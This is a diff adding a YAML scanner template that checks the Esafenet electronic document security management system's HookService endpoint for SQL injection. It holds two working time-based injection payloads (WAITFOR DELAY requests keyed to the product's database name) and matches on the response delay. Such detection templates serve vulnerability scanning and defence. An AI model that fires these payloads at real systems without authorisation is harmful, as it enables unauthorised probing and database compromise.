@@ -1,0 +1,17 @@
+name: 亿赛通-电子文档安全管理系统-HookService-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 7
+matchCount: 2
+rules:
+  - method: GET
+    path: /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1%27;if(db_name()=%27CobraDGServer%27)+WAITFOR+DELAY+%270:0:5%27--
+    expression:
+      status: 404
+      sleep: 5
+  - method: GET
+    path: /CDGServer3/parameter/HookService;logindojojs?command=DelHookService&hookId=1%27;if(db_name()=%27CobraDGServer%27)+WAITFOR+DELAY+%270:0:3%27--
+    expression:
+      status: 404
+      sleep: 3
